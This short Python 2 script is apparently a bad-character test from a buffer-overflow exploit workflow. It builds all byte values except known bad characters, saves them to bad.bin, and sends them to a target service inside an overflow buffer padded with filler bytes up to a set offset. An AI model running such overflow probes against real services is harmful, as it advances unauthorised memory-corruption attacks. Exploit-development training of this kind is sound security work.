#!/usr/bin/env python2
import socket
from config import *

badchar_test = ""

for i in range(0x00, 0xFF+1):
       if i not in BADCHARS:
               badchar_test += chr(i)

with open("bad.bin", "wb") as f:
       f.write(badchar_test)


buf = ""
buf += "A"*(OFFSET - len(buf))
buf += "B"*NO_B
buf += "Z"*NO_Z
buf += badchar_test
buf += "D"*(BUFT - len(buf))

connect(buf)
